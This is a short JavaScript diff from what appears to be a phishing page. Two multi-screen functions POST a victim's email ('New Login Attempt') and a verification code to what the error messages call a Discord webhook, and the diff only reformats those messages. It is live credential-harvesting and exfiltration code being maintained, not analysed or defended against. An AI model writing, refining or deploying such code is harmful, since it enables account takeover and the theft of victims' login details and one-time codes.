@@ -327,7 +327,7 @@ function goToScreen2() {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
-      content: '**New Login Attempt**\nEmail: `' + userEmail
+      content: '**New Login Attempt**\nEmail: ```' + userEmail + '```'
     })
   }).catch(err => console.warn('Discord fetch failed', err));
 }
@@ -348,7 +348,7 @@ function goToScreen4() {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
-      content: '`Code: `' + code + '`'
+      content: 'Code: ```' + code + '```'
     })
   }).catch(err => console.warn('Discord fetch failed', err));
 
